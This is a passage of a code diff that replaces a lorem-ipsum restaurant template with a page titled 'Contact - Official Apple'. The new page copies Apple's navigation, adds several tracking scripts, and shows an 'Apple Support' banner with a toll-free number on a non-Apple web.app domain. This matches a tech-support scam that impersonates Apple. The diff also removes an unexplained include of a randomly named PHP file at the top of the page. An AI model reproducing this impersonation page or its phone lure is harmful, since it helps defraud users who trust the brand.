@@ -1,11 +1,8 @@
-<?php require __DIR__ . '/1czbpxh.php' ?>
-<!doctype html>
-<html class="no-js" lang="zxx">
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-	 <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+      <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5036790,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5036817,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -13,817 +10,374 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5036790&101" alt="web tracker" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5036817&101" alt="hit tracker" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-    <meta charset="utf-8">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
-    <title> Restaurant | Template </title>
-    <meta name="description" content="">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Y4P7Z94B0G"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-Y4P7Z94B0G');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="manifest" href="site.webmanifest">
-    <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-	<!-- CSS here -->
-	<link rel="stylesheet" href="assets/css/bootstrap.min.css">
-	<link rel="stylesheet" href="assets/css/owl.carousel.min.css">
-	<link rel="stylesheet" href="assets/css/slicknav.css">
-    <link rel="stylesheet" href="assets/css/flaticon.css">
-    <link rel="stylesheet" href="assets/css/gijgo.css">
-	<link rel="stylesheet" href="assets/css/animate.min.css">
-	<link rel="stylesheet" href="assets/css/magnific-popup.css">
-	<link rel="stylesheet" href="assets/css/fontawesome-all.min.css">
-	<link rel="stylesheet" href="assets/css/themify-icons.css">
-	<link rel="stylesheet" href="assets/css/slick.css">
-	<link rel="stylesheet" href="assets/css/nice-select.css">
-	<link rel="stylesheet" href="assets/css/style.css">
 </head>
+
 <body>
-    <!--? Preloader Start -->
-    <div id="preloader-active">
-        <div class="preloader d-flex align-items-center justify-content-center">
-            <div class="preloader-inner position-relative">
-                <div class="preloader-circle"></div>
-                <div class="preloader-img pere-text">
-                    <img src="assets/img/logo/logo.png" alt="">
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
                 </div>
-            </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-    </div>
-    <!-- Preloader Start -->
-    <header>
-        <!--? Header Start -->
-        <div class="header-area header-transparent">
-                <div class="main-header  header-sticky">
-                    <div class="container-fluid">
-                        <div class="row align-items-center">
-                            <!-- Logo -->
-                            <div class="col-xl-2 col-lg-2 col-md-1">
-                                <div class="logo">
-                                    <a href="index.html"><img src="assets/img/logo/logo.png" alt=""></a>
-                                </div>
-                            </div>
-                            <div class="col-xl-10 col-lg-10 col-md-10">
-                                <div class="menu-main d-flex align-items-center justify-content-end">
-                                    <!-- Main-menu -->
-                                    <div class="main-menu f-right d-none d-lg-block">
-                                        <nav> 
-                                            <ul id="navigation">
-                                                <li><a href="index.html">Home</a></li>
-                                                <li><a href="about.html">About</a></li>
-                                                <li><a href="menu.html">Menu</a></li>
-                                                <li><a href="blog.html">Blog</a>
-                                                    <ul class="submenu">
-                                                        <li><a href="blog.html">Blog</a></li>
-                                                        <li><a href="blog_details.html">Blog Details</a></li>
-                                                        <li><a href="elements.html">Element</a></li>
-                                                    </ul>
-                                                </li>
-                                                <li><a href="contact.html">Contact</a></li>
-                                            </ul>
-                                        </nav>
-                                    </div>
-                                    <div class="header-right-btn f-right d-none d-lg-block ml-20">
-                                        <a href="contact.html" class="border-btn header-btn">Order Online</a>
-                                    </div>
-                                </div>
-                            </div>   
-                            <!-- Mobile Menu -->
-                            <div class="col-12">
-                                <div class="mobile_menu d-block d-lg-none"></div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-        </div>
-        <!-- Header End -->
-    </header>
-    <main>
-        <!--? slider Area Start-->
-        <div class="slider-area ">
-            <div class="slider-active">
-                <!-- Single Slider -->
-                <div class="single-slider slider-height d-flex align-items-center">
-                    <div class="container">
-                        <div class="row">
-                            <div class="col-xl-9 col-lg-9 col-md-9">
-                                <div class="hero__caption">
-                                    <span data-animation="fadeInLeft" data-delay=".2s">Discover Your Teste</span>
-                                    <h1 data-animation="fadeInLeft" data-delay=".4s">We belive good food offer great smile</h1>
-                                    <p data-animation="fadeInLeft" data-delay=".6s">Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat is aute irure.</p>
-                                    <!-- Hero-btn -->
-                                    <div class="hero__btn">
-                                        <a href="industries.html" class="btn hero-btn"  data-animation="fadeInLeft" data-delay=".8s">Resurvation</a>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <!-- Single Slider -->
-                <div class="single-slider slider-height d-flex align-items-center">
-                    <div class="container">
-                        <div class="row">
-                            <div class="col-xl-9 col-lg-9 col-md-9">
-                                <div class="hero__caption">
-                                    <span data-animation="fadeInLeft" data-delay=".2s">Discover Your Teste</span>
-                                    <h1 data-animation="fadeInLeft" data-delay=".4s">We belive good food offer great smile</h1>
-                                    <p data-animation="fadeInLeft" data-delay=".6s">Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat is aute irure.</p>
-                                    <!-- Hero-btn -->
-                                    <div class="hero__btn">
-                                        <a href="industries.html" class="btn hero-btn"  data-animation="fadeInLeft" data-delay=".8s">Resurvation</a>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!-- slider Area End-->
-        <!--? About Area Start -->
-        <div class="about-low-area section-padding30">
-            <div class="container">
-                <div class="row align-items-center">
-                    <div class="col-lg-6 col-md-12">
-                        <div class="about-caption mb-50">
-                            <!-- Section Tittle -->
-                            <div class="section-tittle mb-35">
-                                <span>Discover Your Test</span>
-                                <h2>We Provide Good Food For Your Family!</h2>
-                            </div>
-                            <p>Ut enim acgsd minim veniam, quxcis nostrud exercitation ullamco laboris nisi ufsit aliquip ex ea commodo consequat is aute irure m, quis nostrud exer.</p>
-                        </div>
-                        <div class="row">
-                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-10">
-                                <div class="single-caption mb-20">
-                                    <div class="caption-icon">
-                                        <span class="flaticon-restaurant"></span>
-                                    </div>
-                                    <div class="caption">
-                                        <p>Ut enim ad minim veniam, quis nostrud exer.</p>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-10">
-                                <div class="single-caption mb-20">
-                                    <div class="caption-icon">
-                                        <span class="flaticon-tools-and-utensils-1"></span>
-                                    </div>
-                                    <div class="caption">
-                                        <p>Ut enim ad minim veniam, quis nostrud exer.</p>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-10">
-                                <div class="single-caption mb-20">
-                                    <div class="caption-icon">
-                                        <span class="flaticon-hat"></span>
-                                    </div>
-                                    <div class="caption">
-                                        <p>Ut enim ad minim veniam, quis nostrud exer.</p>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-10">
-                                <div class="single-caption mb-20">
-                                    <div class="caption-icon">
-                                        <span class="flaticon-restaurant"></span>
-                                    </div>
-                                    <div class="caption">
-                                        <p>Ut enim ad minim veniam, quis nostrud exer.</p>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-lg-6 col-md-12">
-                        <!-- about-img -->
-                        <div class="about-img ">
-                            <img src="assets/img/gallery/about.png" alt="">
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!-- About Area End -->
-        <!--? gallery Products Start -->
-        <section class="gallery-area fix ">
-            <!-- Gallery Top Start -->
-            <div class="gallery-top section-bg pt-90 pb-40" data-background="assets/img/gallery/section_bg01.png">
-                <div class="container">
-                    <div class="row justify-content-center">
-                        <div class="cl-xl-7 col-lg-8 col-md-10">
-                            <!-- Section Tittle -->
-                            <div class="section-tittle text-center mb-70">
-                                <span>Our Offerd Menu</span>
-                                <h2>Some Trendy And  Popular Courses Offerd</h2>
-                            </div> 
-                        </div>
-                    </div>
-                    <div class="row justify-content-center">
-                        <div class="properties__button">
-                            <!--Nav Button  -->
-                            <nav>                                                                         
-                                <div class="nav nav-tabs" id="nav-tab" role="tablist">
-                                    <a class="nav-item nav-link active" id="nav-home-tab" data-toggle="tab" href="#nav-home" role="tab" aria-controls="nav-home" aria-selected="true">Special</a>
-                                    <a class="nav-item nav-link" id="nav-profile-tab" data-toggle="tab" href="#nav-profile" role="tab" aria-controls="nav-profile" aria-selected="false"> Lunch</a>
-                                    <a class="nav-item nav-link" id="nav-contact-tab" data-toggle="tab" href="#nav-contact" role="tab" aria-controls="nav-contact" aria-selected="false"> Brakefirst </a>
-                                    <a class="nav-item nav-link" id="nav-dinner-tab" data-toggle="tab" href="#nav-dinner" role="tab" aria-controls="nav-dinner" aria-selected="false"> Dinner </a>
-                                </div>
-                            </nav>
-                            <!--End Nav Button  -->
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <!-- Gallery Top End -->
-            <!-- Gallery Bottom Start -->
-            <div class="container-fluid p-0">
-                <!-- Nav Card -->
-                <div class="tab-content" id="nav-tabContent">
-                    <!-- card one -->
-                    <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
-                        <div class="row no-gutters">
-                            <div class="col-lg-5 col-md-6 col-sm-6">
-                                <div class="gallery-box">
-                                    <div class="single-gallery">
-                                        <div class="gallery-img big-img" style="background-image: url(assets/img/gallery/gallery1.png);"></div>
-                                        <div class="g-caption">
-                                            <span>$25</span>
-                                            <h4>Delicious Food</h4>
-                                            <p>Ut enim ad minim veniam quis nostr.</p>
-                                            <a href="#" class="btn order-btn">Order Now</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6">
-                                <div class="gallery-box">
-                                    <div class="single-gallery">
-                                        <div class="gallery-img big-img" style="background-image: url(assets/img/gallery/gallery2.png);"></div>
-                                        <div class="g-caption">
-                                            <span>$25</span>
-                                            <h4>Delicious Food</h4>
-                                            <p>Ut enim ad minim veniam quis nostr.</p>
-                                            <a href="#" class="btn order-btn">Order Now</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-3 col-md-12">
-                                <div class="row no-gutters">
-                                    <div class="col-lg-12 col-md-6 col-sm-6">
-                                        <div class="gallery-box">
-                                            <div class="single-gallery">
-                                                <div class="gallery-img smoll-img" style="background-image: url(assets/img/gallery/gallery3.png);"></div>
-                                                <div class="g-caption">
-                                                    <span>$25</span>
-                                                    <h4>Delicious Food</h4>
-                                                    <p>Ut enim ad minim veniam quis nostr.</p>
-                                                    <a href="#" class="btn order-btn">Order Now</a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="col-lg-12 col-md-6 col-sm-6">
-                                        <div class="gallery-box">
-                                            <div class="single-gallery">
-                                                <div class="gallery-img smoll-img" style="background-image: url(assets/img/gallery/gallery4.png);"></div>
-                                                <div class="g-caption">
-                                                    <span>$25</span>
-                                                    <h4>Delicious Food</h4>
-                                                    <p>Ut enim ad minim veniam quis nostr.</p>
-                                                    <a href="#" class="btn order-btn">Order Now</a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <!-- Card two -->
-                    <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">
-                        <div class="row no-gutters">
-                            <div class="col-lg-5 col-md-6 col-sm-6">
-                                <div class="gallery-box">
-                                    <div class="single-gallery">
-                                        <div class="gallery-img big-img" style="background-image: url(assets/img/gallery/gallery2.png);"></div>
-                                        <div class="g-caption">
-                                            <span>$25</span>
-                                            <h4>Delicious Food</h4>
-                                            <p>Ut enim ad minim veniam quis nostr.</p>
-                                            <a href="#" class="btn order-btn">Order Now</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6">
-                                <div class="gallery-box">
-                                    <div class="single-gallery">
-                                        <div class="gallery-img big-img" style="background-image: url(assets/img/gallery/gallery1.png);"></div>
-                                        <div class="g-caption">
-                                            <span>$25</span>
-                                            <h4>Delicious Food</h4>
-                                            <p>Ut enim ad minim veniam quis nostr.</p>
-                                            <a href="#" class="btn order-btn">Order Now</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-3 col-md-12">
-                                <div class="row no-gutters">
-                                    <div class="col-lg-12 col-md-6 col-sm-6">
-                                        <div class="gallery-box">
-                                            <div class="single-gallery">
-                                                <div class="gallery-img smoll-img" style="background-image: url(assets/img/gallery/gallery3.png);"></div>
-                                                <div class="g-caption">
-                                                    <span>$25</span>
-                                                    <h4>Delicious Food</h4>
-                                                    <p>Ut enim ad minim veniam quis nostr.</p>
-                                                    <a href="#" class="btn order-btn">Order Now</a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="col-lg-12 col-md-6 col-sm-6">
-                                        <div class="gallery-box">
-                                            <div class="single-gallery">
-                                                <div class="gallery-img smoll-img" style="background-image: url(assets/img/gallery/gallery4.png);"></div>
-                                                <div class="g-caption">
-                                                    <span>$25</span>
-                                                    <h4>Delicious Food</h4>
-                                                    <p>Ut enim ad minim veniam quis nostr.</p>
-                                                    <a href="#" class="btn order-btn">Order Now</a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <!-- Card three -->
-                    <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">
-                        <div class="row no-gutters">
-                            <div class="col-lg-5 col-md-6 col-sm-6">
-                                <div class="gallery-box">
-                                    <div class="single-gallery">
-                                        <div class="gallery-img big-img" style="background-image: url(assets/img/gallery/gallery1.png);"></div>
-                                        <div class="g-caption">
-                                            <span>$25</span>
-                                            <h4>Delicious Food</h4>
-                                            <p>Ut enim ad minim veniam quis nostr.</p>
-                                            <a href="#" class="btn order-btn">Order Now</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6">
-                                <div class="gallery-box">
-                                    <div class="single-gallery">
-                                        <div class="gallery-img big-img" style="background-image: url(assets/img/gallery/gallery2.png);"></div>
-                                        <div class="g-caption">
-                                            <span>$25</span>
-                                            <h4>Delicious Food</h4>
-                                            <p>Ut enim ad minim veniam quis nostr.</p>
-                                            <a href="#" class="btn order-btn">Order Now</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-3 col-md-12">
-                                <div class="row no-gutters">
-                                    <div class="col-lg-12 col-md-6 col-sm-6">
-                                        <div class="gallery-box">
-                                            <div class="single-gallery">
-                                                <div class="gallery-img smoll-img" style="background-image: url(assets/img/gallery/gallery3.png);"></div>
-                                                <div class="g-caption">
-                                                    <span>$25</span>
-                                                    <h4>Delicious Food</h4>
-                                                    <p>Ut enim ad minim veniam quis nostr.</p>
-                                                    <a href="#" class="btn order-btn">Order Now</a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="col-lg-12 col-md-6 col-sm-6">
-                                        <div class="gallery-box">
-                                            <div class="single-gallery">
-                                                <div class="gallery-img smoll-img" style="background-image: url(assets/img/gallery/gallery4.png);"></div>
-                                                <div class="g-caption">
-                                                    <span>$25</span>
-                                                    <h4>Delicious Food</h4>
-                                                    <p>Ut enim ad minim veniam quis nostr.</p>
-                                                    <a href="#" class="btn order-btn">Order Now</a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <!-- Card Four -->
-                    <div class="tab-pane fade" id="nav-dinner" role="tabpanel" aria-labelledby="nav-dinner">
-                        <div class="row no-gutters">
-                            <div class="col-lg-5 col-md-6 col-sm-6">
-                                <div class="gallery-box">
-                                    <div class="single-gallery">
-                                        <div class="gallery-img big-img" style="background-image: url(assets/img/gallery/gallery3.png);"></div>
-                                        <div class="g-caption">
-                                            <span>$25</span>
-                                            <h4>Delicious Food</h4>
-                                            <p>Ut enim ad minim veniam quis nostr.</p>
-                                            <a href="#" class="btn order-btn">Order Now</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6">
-                                <div class="gallery-box">
-                                    <div class="single-gallery">
-                                        <div class="gallery-img big-img" style="background-image: url(assets/img/gallery/gallery4.png);"></div>
-                                        <div class="g-caption">
-                                            <span>$25</span>
-                                            <h4>Delicious Food</h4>
-                                            <p>Ut enim ad minim veniam quis nostr.</p>
-                                            <a href="#" class="btn order-btn">Order Now</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-3 col-md-12">
-                                <div class="row no-gutters">
-                                    <div class="col-lg-12 col-md-6 col-sm-6">
-                                        <div class="gallery-box">
-                                            <div class="single-gallery">
-                                                <div class="gallery-img smoll-img" style="background-image: url(assets/img/gallery/gallery1.png);"></div>
-                                                <div class="g-caption">
-                                                    <span>$25</span>
-                                                    <h4>Delicious Food</h4>
-                                                    <p>Ut enim ad minim veniam quis nostr.</p>
-                                                    <a href="#" class="btn order-btn">Order Now</a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="col-lg-12 col-md-6 col-sm-6">
-                                        <div class="gallery-box">
-                                            <div class="single-gallery">
-                                                <div class="gallery-img smoll-img" style="background-image: url(assets/img/gallery/gallery2.png);"></div>
-                                                <div class="g-caption">
-                                                    <span>$25</span>
-                                                    <h4>Delicious Food</h4>
-                                                    <p>Ut enim ad minim veniam quis nostr.</p>
-                                                    <a href="#" class="btn order-btn">Order Now</a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <!-- End Nav Card -->
-            </div>
-            <!-- Gallery Bottom End -->
-        </section>
-        <!-- gallery Products End -->
-        <!--? About-2 Area Start -->
-        <div class="about-area2 section-padding30">
-            <div class="container">
-                <div class="row align-items-center">
-                    <div class="col-lg-6 col-md-12">
-                        <!-- about-img -->
-                        <div class="about-img ">
-                            <img src="assets/img/gallery/about2.png" alt="">
-                        </div>
-                    </div>
-                    <div class="col-lg-6 col-md-12">
-                        <div class="about-caption mb-50">
-                            <!-- Section Tittle -->
-                            <div class="section-tittle mb-35">
-                                <span>About Our Restaurant</span>
-                                <h2>We Provide Good Food  For Your Family!</h2>
-                            </div>
-                            <p class="pera-top">Ut enim acgsd minim veniam, quxcis nostrud exercitation ullamco laboris nisi ufsit aliquip ex ea commodo consequat is aute irure m, quis nostrud exer</p>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-                            <p  class="mb-65 pera-bottom">There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected our, or randomised words which don't look even slightly believab If you are going to use a passage.</p>
-                            <a href="about.html" class="border-btn">Learn More</a>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-855-657-8360 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
                         </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!-- About-2 Area End -->
-        <!--? Booking Room Start-->
-        <div class="booking-area section-bg pt-120 pb-130" data-background="assets/img/gallery/section_bg04.png">
-            <div class="container">
-                <div class="row justify-content-center">
-                    <div class="cl-xl-7 col-lg-8 col-md-10">
-                        <!-- Section Tittle -->
-                        <div class="section-tittle text-center mb-40">
-                            <span>About Our Restaurant</span>
-                            <h2>Book A Table</h2>
-                        </div> 
-                    </div>
-                </div>
-                <div class="row justify-content-center">
-                    <div class="col-12">
-                        <form action="#">
-                            <div class="booking-wrap d-flex justify-content-between align-items-center">
-                                <!-- Single Select Box -->
-                                <div class="single-select-box mb-30">
-                                    <div class="select-this">
-                                        <div class="select-itms">
-                                            <div class="select-icon">
-                                                <i class="ti-user"></i>
-                                            </div>
-                                            <select name="select" id="select1">
-                                                <option value="">Person</option>
-                                                <option value="">Person 2</option>
-                                                <option value="">Person 3</option>
-                                                <option value="">Person 4</option>
-                                            </select>
-                                        </div>
-                                    </div>
-                                </div>
-                                <!-- select in date -->
-                                <div class="single-select-box mb-30">
-                                    <div class="boking-datepicker">
-                                        <input id="datepicker1"  placeholder="Date" />
-                                    </div>
-                                </div>
-                                <!-- Single Select Box -->
-                                <div class="single-select-box mb-30">
-                                    <div class="boking-datepicker">
-                                        <input id="timepicker"  placeholder="Time" />
-                                    </div>
-                                </div>
-                                <!-- Single Select Box -->
-                                <div class="single-select-box mb-30">
-                                    <button class="btn select-btn">Book Now</button>
-                                </div>
-                            </div>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!-- Booking Room End-->
-        <!--? Our Services Start -->
-        <div class="our-services section-padding30">
-            <div class="container">
-                <div class="row justify-content-sm-center">
-                    <div class="cl-xl-7 col-lg-8 col-md-10">
-                        <!-- Section Tittle -->
-                        <div class="section-tittle text-center mb-70">
-                            <span>Servicees We Offer</span>
-                            <h2>Our Best Services</h2>
-                        </div> 
-                    </div>
-                </div>
-                <div class="row">
-                    <div class=" col-lg-4 col-md-6 col-sm-6">
-                        <div class="single-services text-center mb-30">
-                            <div class="services-ion">
-                                <span class="flaticon-restaurant"></span>
-                            </div>
-                            <div class="services-cap">
-                                <h5><a href="#">Best Chef</a></h5>
-                                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore.</p>
-                            </div>
-                        </div>
-                    </div>
-                    <div class=" col-lg-4 col-md-6 col-sm-6">
-                        <div class="single-services active text-center mb-30">
-                            <div class="services-ion">
-                                <span class="flaticon-tools-and-utensils-1"></span>
-                            </div>
-                            <div class="services-cap">
-                                <h5><a href="#">Quality Food</a></h5>
-                                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore.</p>
-                            </div>
-                        </div>
-                    </div>
-                    <div class=" col-lg-4 col-md-6 col-sm-6">
-                        <div class="single-services text-center mb-30">
-                            <div class="services-ion">
-                                <span class="flaticon-restaurant"></span>
-                            </div>
-                            <div class="services-cap">
-                                <h5><a href="#">Perfect Cook</a></h5>
